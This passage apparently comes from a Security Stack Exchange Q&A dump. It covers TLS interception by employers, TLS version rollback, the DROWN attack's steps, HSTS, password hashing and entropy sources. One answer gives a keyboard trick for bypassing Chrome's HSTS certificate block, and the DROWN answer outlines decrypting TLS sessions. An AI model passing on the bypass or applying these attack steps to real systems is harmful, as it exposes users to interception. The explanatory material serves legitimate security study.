<li>Is it possible for someone to be a man-in-the-middle if that someone controls the IT infrastructure? If so, how exactly?</li>
<li>Is my login and password read in plain text on the employer's web proxy server?</li>
<li>What should I check in the browser to verify that I have a secure connection from the browser all the way to the Gmail server?</li>
</ol>

<p><em>EDIT, 18.07.2014</em></p>

<ul>
<li>Privacy is not a concern. I'm just curious about how TLS works in this particular scenario. What other means the employer has to intercept communication (keylogger etc.) are not relevant in this particular case.</li>
<li>Legal matters aren't a concern. Employees are allowed to use company IT equipment for private communication within certain limits. On the other hand, the employer reserves the right to do monitoring without violating privacy.</li>
</ul>
","<p>You are absolutely correct in your assumptions. </p>

<p>If you are using a computer owned and operated by your employer, they effectively have full control over your communications. Based on what you have provided, they have installed a root CA certificate that allows them to sign a certificate for Google themselves. </p>

<p>This isn't that uncommon in the enterprise, as it allows inspection of encrypted traffic for virus or data leaks. </p>

<p>To answer your three questions:</p>

<ol>
<li><p>Yes it is very possible, and likely. How active they are at monitoring these things is unknown.</p></li>
<li><p>Your password can be read in plain text by your employer. I don't know what you mean about the web server. </p></li>
<li><p>You can check the certificate to see who signed it, as you have already done. You can also compare the fingerprint to that of Google (checked from a third party outside of business control)</p></li>
</ol>

<p>Edit:</p>

<blockquote>
  <p>How exactly is my employer able to unencrypt that? Could you perhaps
  elaborate on that a bit?</p>
</blockquote>

<p>You are using the bad certificate to connect to an intermediary device such as the firewall, that device is then connecting to Google using the correct certificate. The communication is encrypted from your client to the MITM, decrypted, and then re-encrypted on its way to Google. </p>
","63306"
"What exactly determines what version of SSL/TLS is used when accessing a site?","21950","","<p>If I click on the little lock icon in Chrome it says that the site in question is using TLS v1.  I also checked using openssl and was able to hit the site using TLS1, SSL2 and SSL3.  From what I understand SSL2 is not secure.  Based on this, it appears that the site could be hit using any of the three.</p>

<p>What determines the version of SSL/TLS that will be used when accessing a secure site from a web browser?</p>
","<p>As @Terry says, the client <em>suggests</em>, the server <em>chooses</em>. There are details:</p>

<ul>
<li><p>The generic format of the first client message (the <code>ClientHello</code>) indicates the highest supported version, and <em>implicitly</em> claims that all previous versions are supported -- which is not necessarily true. For instance, if the client supports TLS 1.2, then it will indicate ""max version: 1.2"". But the server may then elect to use a previous version (say, TLS 1.0), that the client does not necessarily want to use.</p></li>
<li><p>Modern clients have taken to the habit of trying several times. For instance, a client may first send a <code>ClientHello</code> stating ""TLS 1.2"", and, if something (anything) fails, it tries again with a <code>ClientHello</code> stating ""TLS 1.0"". Clients do that because there are poorly implemented, non-conforming TLS servers who can do TLS 1.0 but reject <code>ClientHello</code> messages that contain ""TLS 1.2"".</p>

<p>An amusing consequence is that an active attacker could force a client and server to use an older version (say TLS 1.0) even when both support a newer protocol version, by forcibly closing the initial connection. This is called a ""version rollback attack"". It is not <em>critical</em> as long as client and server never accept to use a definitely weak protocol version (and TLS 1.0 is still reasonably strong). Yet this implies that a client and server cannot have a guarantee that they are using the ""best"" possible protocol version as long as the client implements such a ""try again"" policy (if the client did not implement such a ""try again"" then the rollback attack would be prevented, but some Web sites would become seemingly unreachable).</p></li>
<li><p>The <code>ClientHello</code> message for SSL 2.0 has a very distinct format. When a client wishes to support both SSL 2.0 and some later version, then it must send a special <code>ClientHello</code> which follows the SSL 2.0 format, and specifies that ""by the way, I also know SSL 3.0 and TLS 1.0"". This is described in <a href=""http://tools.ietf.org/html/rfc2246#appendix-E"">appendix E of RFC 2246</a>. Modern SSL clients (Web browsers) don't do that anymore (I think IE 6.0 still did it, but not IE 7.0).</p>

<p><a href=""http://tools.ietf.org/html/rfc4346#appendix-E"">RFC 4346</a> (TLS 1.1) specifies that such SSLv2-format <code>ClientHello</code> messages will be ""phased out"" at some point and should be avoided. <a href=""http://tools.ietf.org/html/rfc5246#appendix-E"">RFC 5246</a> (TLS 1.2) more clearly states that clients SHOULD NOT support SSL 2.0, and thus should have no reason to send such <code>ClientHello</code> messages. <a href=""http://tools.ietf.org/html/rfc6176"">RFC 6176</a> now <em>prohibits</em> SSL 2.0 altogether.</p>

<p>Now a RFC is not a law: you don't go to jail because you don't support any particular RFC. However, RFC still provide guidance, and thus somehow illustrate what will be the state of things in the near (or far) future.</p></li>
</ul>

<p><strong>In practice:</strong></p>

<ul>
<li>Most clients out there will send only SSLv3+ <code>ClientHello</code> messages, and will happily connect with SSL 3.0, TLS 1.0, TLS 1.1 or TLS 1.2, depending on what the server appears to support (but, due to the ""try again"" policy, a version downgrade can be forced upon by an active attacker).</li>
<li>Actually, some clients won't support SSL 3.0, and require TLS 1.0.</li>
<li>Similarly, some clients won't support TLS 1.1 or 1.2. Web browsers have been updated in the recent years (in the aftermath of the bad press resulting from the BEAST attack) but non-browser applications are rarely as aggressively maintained.</li>
<li>Many server still accept a SSLv2 <code>ClientHello</code> format, as long as that <code>ClientHello</code> message is a SSLv3+ <code>ClientHello</code> in disguise.</li>
<li>A few servers, like yours, are still happy to do some SSL 2.0. This does not conform to RFC 6176, and is frowned upon (people who believe in ""grading SSL servers"" will give you a bad score for that). This is not a serious security issue, though, as long as clients don't actually support SSL 2.0. Even if a client supports SSL 2.0, it should include some rollback-prevention trickery (described in RFC 2246) so a rollback down to SSL 2.0 should not work.</li>
</ul>

<p>You still want to deactivate SSL 2.0 support in your server (not necessarily SSLv2 <code>ClientHello</code> format, but actual SSL 2.0 support), if only for public relations.</p>
","59372"
"What is DROWN and how does it work?","21927","","<p>There is a new <a href=""https://drownattack.com/drown-attack-paper.pdf"">recent attack</a> <a href=""http://arstechnica.com/security/2016/03/more-than-13-million-https-websites-imperiled-by-new-decryption-attack/"">""on TLS""</a> <a href=""http://blog.cryptographyengineering.com/2016/03/attack-of-week-drown.html"">named</a> <a href=""https://drownattack.com/"">""DROWN""</a>. I understand that it appears to use bad SSLv2 requests to recover static (certificate) keys.</p>

<p>My question is: <em>How?</em></p>

<p><strong>How can you recover static encryption or signature keys using SSLv2?</strong></p>

<p>Bonus questions: How can I prevent the attack from applying to me as a server admin? How could the attack spawn in the first place?</p>
","<p>To understand the attack, one must recall Bleichenbacher's attack from the late 20th century. In that attack, the attacker uses the target server as an <em>oracle</em>. When using RSA-based key exchange, the client is supposed to send a secret value (the ""pre-master secret"") encrypted with the server's public key, using <a href=""http://tools.ietf.org/html/rfc3447"">PKCS#1</a> v1.5 padding (called ""type 2""). Bleichenbacher's attack relied on sending carefully crafted values in lieu of a properly encrypted message, and observe the server's reaction. The server might respond (most of the time) with an error saying ""I processed that but it did not yield a proper PKCS#1 v1.5 type 2 padding""; but sometimes, the decryption seems to work and the server proceeds with whatever it obtained. The attacker sees that difference in behaviour, and thus gains a tiny bit on information on the private key. After a million connections or so, the attacker knows enough to perform an arbitrary decryption and thus break a previously recorded session.</p>

<p>This attack is of the same kind, but with a new technique that relies on the specificities of SSL 2.0. SSL 2.0 is an old protocol version that has several serious flaws and should not be used. It has been deprecated for more than 15 years. It has been even formally <a href=""https://tools.ietf.org/html/rfc6176"">prohibited</a> in 2011. Nevertheless, some people still support SSL 2.0. Even worse, they support it with so-called ""export"" cipher suites where encryption strength is down to about 40 bits.</p>

<p><strong>So the attack works a bit like this:</strong></p>

<ol>
<li><p>The attacker observes an encrypted SSL/TLS session (a modern, robust one, say TLS 1.2) that uses RSA key exchange, and he would like to decrypt it. Not all SSL/TLS sessions are amenable to the attack as described; there is a probability of about 1/1000 that the attack works. So the attacker will need to gather about a thousand encrypted sessions, and will ultimately break through one of them. The authors argue that in a setup which looks like the ones for CRIME and BEAST (hostile Javascript that triggers invisible connections in the background), this collection can be automated.</p></li>
<li><p>The server carelessly uses the same RSA private key for a SSL 2.0 system (maybe the same server, maybe another software system that may implement another protocol, e.g. a mail server). The attacker has the possibility to try to talk to that other system.</p></li>
<li><p>The attacker begins a SSL 2.0 handshake with that system, using as <code>ClientMasterKey</code> message a value derived from the one that the attacker wants to decrypt. He also asks for using a 40-bit export cipher suite.</p></li>
<li><p>The attacker observes the server's response, and brute-forces the 40-bit value that the server came up with when it decrypted the value sent by the attacker. At that point, the attacker knows part of the result of the processing of his crafted value by the server with its private key. This indirectly yields a bit of information on the encrypted message that the attacker is really interested in.</p></li>
<li><p>The attacker needs to do steps 3 and 4 about a few thousand times, in order to recover the encrypted pre-master secret from the target session.</p></li>
</ol>

<p>For the mathematical details, read <a href=""https://www.drownattack.com/drown-attack-paper.pdf"">the article</a>.</p>

<p><strong>Conditions for application:</strong></p>

<ul>
<li><p>The connection must use RSA key exchange. The attack, as described, cannot do much against a connection that uses DHE or ECDHE key exchange (which are recommended anyway for <a href=""https://en.wikipedia.org/wiki/Forward_secrecy"">forward secrecy</a>).</p></li>
<li><p>The same private key must be used in a system that implements SSL 2.0, accessible to the attacker, and that furthermore accepts to negotiate an ""export"" cipher suite.<br /><strong>Note</strong>: If OpenSSL is used and not <a href=""https://www.openssl.org/news/secadv/20160128.txt"">patched for CVE-2015-3197</a>, even if ""export"" cipher suites are disabled, a malicious client can still negotiate and complete a handshake with those disabled cipher suites.</p></li>
<li><p>The attacker must be able to make a few thousands or so connections to that SSL 2.0 system, and then run a 40-bit brute force for each; the total computing cost is about 2<sup>50</sup> operations.</p></li>
</ul>

<p>It must be well understood that the 2<sup>50</sup> effort is for each connection that the attacker tries to decrypt. If he wants to, say, read credit card numbers from connections he observes, he will need to make a non-negligible amount of work for each credit card number. While the attack is very serious, it is not really practical in that CCN-grabbing setup.</p>

<hr />

<p><strong>The solution: don't use SSL 2.0. Dammit.</strong> You should have stopped using SSL 2.0 in the previous millenium. When we said ""don't use it, it is weak"", we really meant it. It is high time to wake up and do your job.</p>

<p>Supporting weak (""export"") cipher suites was not a smart move either. Guess what ? Weak crypto is weak.</p>

<p>Deactivating SSL 2.0 is the only right way to fix the issue. While you are at it, deactivate <a href=""https://tools.ietf.org/html/rfc7568"">SSL 3.0</a> as well.</p>

<p>(And that fashion of using all-uppercase acronyms for attacks is really ridiculous.)</p>
","116140"
"Why should I offer HTTP in addition to HTTPS?","21833","","<p>I am setting up a new webserver. In addition to TLS/HTTPS, I'm considering implementing <a href=""https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"" rel=""noreferrer"">Strict-Transport-Security</a> and other HTTPS-enforcement mechanisms.</p>

<p>These all seem to be based on the assumption that I am serving <code>http://www.example.com</code> in addition to <code>https://www.example.com</code>. Why don't I just serve HTTPS only? That is, is there a security-based reason to serve HTTP -- for example, could someone spoof <code>http://www.example.com</code> if I don't set up HSTS?</p>
","<blockquote>
  <p>Why don't I just serve https only?</p>
</blockquote>

<p>The main reasons are the <em>default behavior</em> of browsers and <em>backward compatibility</em>.</p>

<h2>Default behavior</h2>

<p>When an end-user (i.e, without knowledge in protocols or security) types the website address in its browser, the browser uses by default HTTP. See <a href=""https://security.stackexchange.com/questions/81801/why-do-browsers-default-to-http-and-not-https-for-typed-in-urls"">this question</a> for more information about why browsers are choosing this behavior.</p>

<p>Thus, it is likely that users will not be able to access your website.</p>

<h2>Backward compatibility</h2>

<p>It is possible that some users with old systems and old browsers do not support HTTPS or more likely, do not have an up-to-date database of <a href=""https://en.wikipedia.org/wiki/Root_certificate"" rel=""noreferrer"">root certificates</a>, or do not support some protocols.</p>

<p>In that case, they either will not be able to access the website or will have a security warning. You need to define whether the security of your end-users is important enough to force HTTPS.</p>

<p>Many websites still listen to HTTP but automatically redirects to HTTPS and ignore users with <em>really</em> old browsers.</p>

<blockquote>
  <p>could someone spoof <a href=""http://www.example.com"" rel=""noreferrer"">http://www.example.com</a> if I don't set up HSTS?</p>
</blockquote>

<p>If an attacker wants to spoof <code>http://www.example.com</code>, it needs to take control of the domain or take control of the IP address in some way.</p>

<p>I assume you meant: could an attacker perform a man-in-the-middle attack?</p>

<p>In that case yes, but even with or without HSTS:</p>

<ul>
<li><p><strong>Without HSTS</strong>: An attacker can easily be in the middle of your server and the user, and be active (i.e, modify the content) or passive (i.e., eavesdrop)</p></li>
<li><p><strong>With HSTS</strong>: The first time a user try to visit the site using HTTP, an attacker could force the user to use HTTP. However, the attacker has a limited time window of when it can perform its attack.</p></li>
</ul>

<h2>What you should do?</h2>

<p>Like many websites, you should allow HTTP connections and make you server redirects the user to the HTTPS version. This way you override the default behavior of browsers and ensure your users use the HTTPS version.</p>

<p>Old systems without the proper protocols or root certificates will not be able to access the site (or at least will have a warning), but depending on your user base this should not be an issue. </p>

<h2>Conclusion</h2>

<p>It will do more harm than good to disable HTTP. It does not really provide more security.</p>

<p>Any security added to protect a resource is useless if it prevents most of its users from accessing it. If your end-users cannot access your website because their browser default to HTTP and you do not listen for HTTP connections, what is the benefit?</p>

<p>Just perform the HTTP 301 redirection to the HTTPS version.</p>

<h2>Related questions</h2>

<ul>
<li><a href=""https://security.stackexchange.com/questions/81801/why-do-browsers-default-to-http-and-not-https-for-typed-in-urls"">Why do browsers default to http: and not https: for typed in URLs?</a></li>
<li><a href=""https://security.stackexchange.com/questions/4369/why-is-https-not-the-default-protocol"">Why is HTTPS not the default protocol?</a></li>
<li><a href=""https://security.stackexchange.com/questions/54038/why-should-one-not-use-ssl"">Why should one not use SSL?</a></li>
<li><a href=""https://security.stackexchange.com/questions/53250/why-do-some-websites-enforce-lack-of-ssl"">Why do some websites enforce lack of SSL?</a></li>
</ul>
","157577"
"Can TrueCrypt encrypt SSDs without performance problems?","21807","","<p>I am running windows 7 prof on a SSD (mSATA). My CPU i7-3610QM has AES-NI-support. I want to encrypt my SSD with truecrypt with AES. But I am really unsure if this is a good idea because of (a) the performance and (b) the lifetime of my ssd.</p>

<p>About (a) I think, encryption works with 3 gb/s because of the AES-NI. So this should be fast enough for SSD-encryption, right? </p>

<p>I heard, that using the full space of a SSD is a bad idea. Nevertheless, I did this. The full 120 GB are formatted currently as my system filesystem. Do I ""destroy"" my SSD with a full system encryption (so pre-booth-authenticatio is required)?</p>

<p>What does happen with the first 100 MB marked in Disk Management with ""System Reserved""?</p>
","<p>Hard disk encryption is not supposed to alter SSD life time: ""encrypted"" bits are not harder to read or write than ""normal"" bits, and (properly done) encryption does not enlarge data. Indeed, the SSD device has no idea whether what it is asked to read or write is encrypted or not. One megabyte is one megabyte.</p>

<p>(<strong>Edit:</strong> about ""encrypting empty space"": this implies only one write pass of the whole disk area; this needs not be done regularly, only once. Flash memory can be rewritten about 10000 times before failing, so this extra encryption should not shorten the SSD lifetime by more than 0.01% -- not enough to be detectable.)</p>

<p>The current state of TrueCrypt being what it is (the ""official"" software has all but disappeared), it is hard to get definitive answers, and even recommending TrueCrypt can now be a matter of delicacy. Thus, claiming that TrueCrypt will or will not use <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"">AES opcodes</a> can be too bold a statement. <a href=""http://www.tomsitpro.com/articles/truecrypt-aes-ni-encryption-aes,2-202-3.html"">This article</a> says that, back in 2011, TrueCrypt 7.0a supported AES-NI, and could follow the speed of a SSD (at least the SSD they used for the benchmark).</p>

<p>Performance, in general, is a matter of <em>measurement</em> and should be benchmarked rather than discussed; especially for something as fuzzy as ""general computer performance"" from the point of view of a human user: the user's feelings are as important as raw figures. The main <em>perceived</em> boost from a SSD comes from the much reduced latency more than from the raw throughput for single-file I/O. We can still speculate that AES-NI allow for more than 1 Gbyte/s raw encryption speed on a 2 GHz CPU; thus, half a core worth of CPU ought to be enough to follow the throughput of a decent SSD (my SSD runs at 500 MB/s and I find it decent enough).</p>

<p>Of course, installing a whole-disk encryption system has the potential, in case of some stupid incompatibility with your OS and/or BIOS booting system, to make your machine unbootable. Make backups ! And prepare a ""recovery disk"".</p>
","61092"
"Is it safe to auto-fill credit card numbers using Chrome?","21803","","<p>Is it safe to auto fill credit card numbers using Chrome? Does it safely store the credit card information? As far as my understanding goes, it just shows asterisk values but on click it reveals the credit card numbers:</p>

<p><img src=""https://i.stack.imgur.com/Kk5XI.gif"" alt=""enter image description here""></p>

<p>My questions are a few :</p>

<ol>
<li><p>Is it possible for to breach Google Chrome and take my credit card information?</p></li>
<li><p>As per my understanding the credit card number is not stored with any type of encryption, so is it really secure to store in autofill data?</p></li>
</ol>

<p>How does Chrome handles this type of data? I agree it's good in terms of usability to store and fill the credit card details, but I doubt its not good in terms of security.</p>
","<blockquote>
  <p>Is it possible for breaching google chrome and take my credit card
  information?</p>
</blockquote>

<p>Yes.  </p>

<p>As long as Chrome can use your number for auto completion, it has to be possible for Chrome to access it. If one program on your computer can do this, another program or a least humans can do it too.  </p>

<blockquote>
  <p>it's not stored with any type of encryption</p>
</blockquote>

<p>Even with encryption, the statement above holds. Chrome would need the key, and this key has to be somewhere on your computer so that Chrome can use it.  </p>

<p>As long as someone can physically access your computer, few things actually help. Encrypting your whole hard drive and taking the key away with you is one possibility. Downside 1: It´s a pain to insert flash drive and password each time to turn it on. Downside 2: If someone gets your computer <em>while it is turned on</em>, everything is futile again.  </p>

<p>If you only want to protect against attacks form the internet, this is much better, <em>but</em> nonetheless there is no 100% protection. Not entering your card number (or any sensitive data) in the computer is the only reliable way.</p>
","92169"
"How secure is RDP?","21701","","<p>I have a sort of a conflict with my company's Security Lead Engineer. He says that <a href=""https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"">Remote Desktop Protocol (RDP)</a> is not secure enough and we should be using <a href=""https://en.wikipedia.org/wiki/TeamViewer"">TeamViewer</a> instead. We use RDP not only to access local resources inside our corporate network but also for the access to resources (running Windows 2012+) in cloud hosting. </p>

<p>In both the scenarios how secure is it to use RDP?</p>
","<p>I believe that Teamviewer is a proxy service for tunnelled VNC connections. Hence, the first security consideration with regard to that service is that it is MITM'ed <em>by design</em>. There have been suggestions that the service was <a href=""http://www.theregister.co.uk/2016/06/01/teamviewer_mass_breach_report/"">compromised a couple of months ago</a>.</p>

<p>(Note that although VNC uses encryption, the entire exchange is not, by default, encapsulated - but it's trivial to setup a SSL/ssh/VPN tunnel).</p>

<p>Next consideration is that it means installing third party software on your systems - but then if you're running a Microsoft platform then you're already running software from multiple vendors which is probably not covered by your patch management software; keeping software up to date is one of the most effective means of protecting your systems. </p>

<p>As long as your RDP connection is using SSL, it should be at least as secure as Teamviewer, and IMHO, a lot more so.</p>
","133356"
"What is the HTTP ""Server"" response-header field used for?","21700","","<p>It was not until recently that I began to question the use for the <code>Server</code> field in the HTTP Response-Header.</p>

<p>I did some research:</p>

<p>RFC 2616 states:</p>

<blockquote>
  <p><strong><a href=""http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.38"">14.38 Server</a></strong></p>
  
  <p>The Server response-header field contains information about the
  software used by the origin server to handle the request. The field
  can contain multiple product tokens (section 3.8) and comments
  identifying the server and any significant subproducts. The product
  tokens are listed in order of their significance for identifying the
  application.</p>

<pre><code>   Server         = ""Server"" "":"" 1*( product | comment )
</code></pre>
  
  <p>Example:</p>

<pre><code>   Server: CERN/3.0 libwww/2.17
</code></pre>
  
  <p>If the response is being forwarded through a proxy, the proxy
  application MUST NOT modify the Server response-header. Instead, it
  SHOULD include a Via field (as described in section 14.45).</p>

<pre><code>  Note: Revealing the specific software version of the server might
  allow the server machine to become more vulnerable to attacks
  against software that is known to contain security holes. Server
  implementors are encouraged to make this field a configurable
</code></pre>
</blockquote>

<p>This, however, makes no mention of the purpose of this field.  This seems like <a href=""http://itlaw.wikia.com/wiki/Information_disclosure"">information disclosure</a> to me.  These server strings give away a lot of information that is great for anyone trying to fingerprint the server.  Automated scanning tools would quickly identify unpatched or vulnerable servers.  Having my web server present version information for itself and modules like OpenSSL seems like a bad idea.</p>

<ul>
<li>Is this field needed... for anything? If so, what?</li>
<li>Is it already best practice / common place to disable or change this field on servers?</li>
</ul>

<p>I would think that, from a security perspective, we would want to give the enemy (ie: Everyone) as little information as possible while still allowing business to continue. <a href=""http://www.airpower.maxwell.af.mil/airchronicles/apj/apj99/sum99/dicenso.html"">Here</a> is an interesting write-up on information warfare.  </p>
","<p>Server information should be removed from HTTP responses, and its an insecure default to leak this data. This isn't a major security risk,  or even a medium security risk - but I don't feel comfortable just announcing such details to my adversaries. Having an exact version number <strong><em>leaks when, and how often you patch your production systems</em></strong> - even if the version is current.  An adversary knowing the patch cycle, means that they know when you are the weakest.</p>

<p>The HTTP Host header probably most useful for the <a href=""http://news.netcraft.com/archives/2012/01/03/january-2012-web-server-survey.html"" rel=""nofollow noreferrer"">Netcraft Web Server Survey</a>.  But in terms of HTTP it shouldn't matter.  That is why we have standards, so that clients and servers written by different vendors can work together.</p>
","23258"
"Chrome SSL Warning: ""You cannot proceed because the website operator has requested heightened security for this domain. ""","21635","","<p>I'm trying to go to the URL below, and Chrome warns me that the wildcard certificate is not valid for this domain.</p>

<p><a href=""https://chart.apis.google.com/chart?cht=qr&amp;chs=100x100&amp;chl=otpauth%3A%2F%2Ftotp%2FTest123%204%3Fsecret%3DTKQWCOOJ7KJ4ZIR"">https://chart.apis.google.com/chart?cht=qr&amp;chs=100x100&amp;chl=otpauth%3A%2F%2Ftotp%2FTest123%204%3Fsecret%3DTKQWCOOJ7KJ4ZIR</a></p>

<p>At first I thought it was a quirk on how chrome handles URLs with many dots in a wildcard cert, however I see this text in the warning, and am also unable to click through</p>

<blockquote>
  <p>You cannot proceed because the website operator has requested heightened security for this domain.</p>
</blockquote>

<p><strong>Question</strong></p>

<ul>
<li><p>Is this a problem with Chrome's wild card certs and sub domains that are more than 2 layers deep?</p></li>
<li><p>Does the error mean that the website owner has ""done something"" to make wildcard certificates not work for subdomains?</p></li>
</ul>
","<p>Please try this Chrome hack: when browser shows the page with the invalid certificate message, type in your keyboard the word ""proceed"" and then hit Enter.</p>

<p>You should be able to proceed to the requested page.</p>

<p>On newer versions of Chrome, you may have to type ""danger"" and hit Enter instead.</p>
","30211"
"Explanation of open ports","21631","","<p>I've run metasploit against my web-server and it found several opened ports that I didn't know.  Please note that I have a firewall and IPSec configured but they were disabled just for testing purposes (servers should be secure even if firewalls are bypassed).</p>

<p>Here's the list of open ports:</p>

<p><img src=""https://i.stack.imgur.com/D1AFy.png"" alt=""enter image description here""></p>

<p>It's a Windows 2008 R2 with IIS 7.5, SQL Server 2008 R2, MSMQ and Memcached installed (among other things). Do you know how to secure those ports (eg, MSMQ should open ports to the public I think)?. Thanks!</p>

<p><strong>Additional info:</strong></p>

<ul>
<li>Ports 135 used by svchost.exe, running ""RPC Endpoint manager"", RpcSs and MSMQ</li>
<li>Ports 445 used by ""System"" (?)</li>
<li>Ports 2103,2105,2107 being used by MSMQ</li>
<li>Port 49152 used by ""wininit.exe - Windows Start-Up application""</li>
<li>Port 49153 used by svchost.exe, running ""TCP/IP NetBIOS Helper"",  ""DHCP Client"" and ""Windows Event Log""</li>
<li>Port 49170 used by services.exe</li>
</ul>
","<p>Your question should not be ""How do I secure these ports"" your but rather ""How do I secure the services listening on these ports"".</p>

<p>There is a wealth of knowledge on well known ports available on the internet and the services that run behind them. I would recommend researching hardening of IIS / Windows server and go from there. </p>

<p>It's good that you've taken a proactive approach to assess your web server, and understanding how it functions. It's not uncommon for known good services to initiate communications and open ports dynamically, so even if your research to a high number port comes empty handed it's not necessarily something to worry about. For the most part Windows IIS is pretty secure out of the box and doesn't require too much tweaking, but just ensure that you're updating your server with patches regularly. These days most attackers will focus on the web application running on your server, rather than attacking the server itself.</p>

<p>Using <a href=""http://technet.microsoft.com/en-us/sysinternals/bb897437.aspx"" rel=""nofollow"">TCP View</a> will also provide you with a look into what services are utilizing the ports. </p>
","46231"
"How can I create a password that says ""SALT ME!"" when hashed?","21603","","<p>How can I create a password, which when directly hashed (without any salt) with md5 will return a string containing the 8 characters ""SALT ME!"". The hope is that a naive developer browsing through his user database will see the ""hash"", realize the insecurity of his application, and eventually make the world a better place for everyone.</p>

<p>Md5 outputs 128 bits, which is 16 bytes. If I had a 16-byte message, getting the original plaintext password would be equivalent to a pre-image, which to my knowledge is practically impossible. However, I'm only looking for 8 specific bytes in my hash.</p>

<p>Is obtaining such a password feasible in day-timeframes on a typical computer? If so, how can I compute such a password?</p>
","<p>The output of MD5 is binary: a sequence of 128 bits, commonly encoded as 16 bytes (technically, 16 <em>octets</em>, but let's use the common convention of bytes being octets).</p>

<p>Humans don't read bits or bytes. They read <em>characters</em>. There are numerous code pages which tell how to encode characters as bytes, and, similarly, to decode bytes into characters. For almost all of them (because of <a href=""http://en.wikipedia.org/wiki/ASCII"">ASCII</a>), the low-value bytes (0 to 31) are ""control characters"", hence not really representable as characters. So nobody really reads MD5 output directly. If someone is ""reading"" the hash values, then these values are most probably encoded into characters using one of the few common conventions for that. The two most prevalent conventions are <a href=""http://en.wikipedia.org/wiki/Hexadecimal"">hexadecimal</a> and <a href=""http://en.wikipedia.org/wiki/Base64"">Base64</a>.</p>

<p>With hexadecimal, there are only digits, and letters 'a' to 'f' (traditionally lowercase for hash values). You won't get ""SALT ME!"" in an hexadecimal output...</p>

<p>With Base64, encoding uses all 26 unaccentuated latin letters (both lowercase and uppercase), digits, and the '+' and '/' signs. You could thus hope for ""SaltMe"" or ""SALTME"". Now <em>that</em> is doable, because each character in Base64 encodes 6 bits, so a 6-letter output corresponds to 36 bits only. Looking for a password which yields either ""SaltMe"" or ""SALTME"" will be done in (on average) <em>2<sup>35</sup></em> tries, i.e. within a few minutes or hours with some decently optimized code.</p>

<p>Note, though, that someone who actually spends some time to read Base64-encoded hash values probably has some, let's say, ""social issues"", and as such might not react the way you hope.</p>

<p><strong>And it is done:</strong> When hashing with MD5 then Base64-encoding the result:</p>

<ul>
<li><code>infjfieq</code> yields: <code>SALTMEnBrODYbFY0c/tf+Q==</code></li>
<li><code>lakvqagi</code> yields: <code>SaltMe+neeRdUB6h99kOFQ==</code></li>
</ul>
","56378"
"What is the specific reason to prefer bcrypt or PBKDF2 over SHA256-crypt in password hashes?","21558","","<p>We know that to slow down password cracking in case a password database leak, passwords should be saved only in a hashed format. And not only that, but hashed with a strong and slow function with a possibility to vary the number of rounds.</p>

<p>Often algorithms like <a href=""https://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a>, <a href=""https://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">bcrypt</a> and <a href=""http://www.tarsnap.com/scrypt.html"" rel=""noreferrer"">scrypt</a> are recommended for this, with bcrypt seemingly getting the loudest votes, e.g. <a href=""https://security.stackexchange.com/a/31846/118457"">here</a>, <a href=""https://codahale.com/how-to-safely-store-a-password/"" rel=""noreferrer"">here</a> and <a href=""https://security.stackexchange.com/questions/17421/how-to-store-salt#comment28218_17435"">here</a>. </p>

<p>But what about the SHA256 and SHA512 based hashes implemented in at least glibc (<a href=""https://www.akkadia.org/drepper/sha-crypt.html"" rel=""noreferrer"">description</a>, <a href=""https://www.akkadia.org/drepper/SHA-crypt.txt"" rel=""noreferrer"">specification</a>) and used by default at least on some Linux distributions for regular login accounts? Is there some reason not to use them, or to otherwise prefer bcrypt over the SHA-2 based hashes? </p>

<p>Of course bcrypt is significantly older (1999) and thus more established, but the SHA-2 hashes are already nine years old by now (2007), and scrypt is even younger by a bit (2009), but still seems to be mentioned more often. Is it just an accepted practice, or is there some other reason?
Are there any known weaknesses in the SHA-2 based hashes, or has anyone looked?</p>

<p><strong>Note:</strong> I specifically mean <strong>the multi-round password hashes</strong> described by the linked documents and marked with the codes <code>$5$</code> and <code>$6$</code> in <code>crypt</code> hashes, <strong>not a single round of the plain SHA256 or SHA512 hash functions</strong>.</p>

<p>I have seen the question this is marked as a possible duplicate of. The answers there have no mention of the SHA256-crypt / SHA512-crypt hashes, which is what I am looking for.</p>
","<p>The main reason to use a specific password hashing function is to make life harder for attackers, or, more accurately, to prevent them from making their own life easier (when compared to that of the defender). In particular, the attacker may want to compute more hashes per second (i.e. try more passwords per second) with a given budget by using a GPU.</p>

<p>SHA-256, in particular, benefits a lot from being implemented on a GPU. Thus, if you use SHA-256-crypt, attackers will be more at an advantage than if you use bcrypt, which is hard to implement efficiently in a GPU.</p>

<p>See <a href=""https://security.stackexchange.com/a/6415/655"">this answer</a> for some discussion of bcrypt vs PBKDF2. Though SHA-256-crypt is not PBKDF2, it is similar enough in its performance behaviour on GPU, so the same conclusions apply.</p>

<p>Case for SHA-512 is a bit less clear because existing GPU are much better at using 32-bit integers than 64-bit, and SHA-512 uses mostly 64-bit operations. It is still expected that modern GPU allow more hashes per second than CPU (for a given budget) with SHA-512-crypt, which again points at bcrypt as the better choice.</p>
","133251"
"Is it appropriate to use haveged as a source of entropy on virtual machines?","21534","","<p>While looking for solutions to entropy pool depletion on virtual machines, I came across an interesting project called <code>haveged</code>, which is based on the <a href=""http://www.irisa.fr/caps/projects/hipsor/"">HAVEGE</a> algorithm (HArdware Volatile Entropy Gathering and Expansion). It makes a pretty fantastic claim.</p>

<blockquote>
  <p>HAVEGE is a random number generator that exploits the modifications of
  the internal CPU  hardware states (caches, branch predictors, TLBs) as
  a source of uncertainty. During an initialization phase, the hardware
  clock cycle counter of the processor is used to gather part of this
  entropy: tens of thousands of unpredictable bits can be gathered per
  operating system call in average.</p>
</blockquote>

<p>If this really produces nearly unlimited high-quality entropy on headless virtual machines, it should be included in every server distribution by default! And yet, some people have raised concerns.</p>

<blockquote>
  <p>""At its heart, [HAVEGE] uses timing information based on the
  processor's high resolution timer (the RDTSC instruction). This
  instruction can be virtualized, and some virtual machine hosts have
  chosen to disable this instruction, returning 0s or predictable
  results.""<br>
  (Source: <a href=""https://polarssl.org/tech-updates/security-advisories/polarssl-security-advisory-2011-02"">PolarSSL Security Advisory 2011-02</a> on polarssl.org).</p>
</blockquote>

<p>And furthermore, popular NIST and ENT tests will sometmies give haveged a PASS even when it's intentionally mis-configured, and not actually producing random numbers!</p>

<blockquote>
  <p>I replaced the “HARDTICKS” macro in HAVEGE with the constant 0 (zero)
  rather than reading the time stamp counter of the processor. This
  immediately failed the randomness test. However, when I used the
  constant 1 (one) instead, the ent test passed. And even nist almost
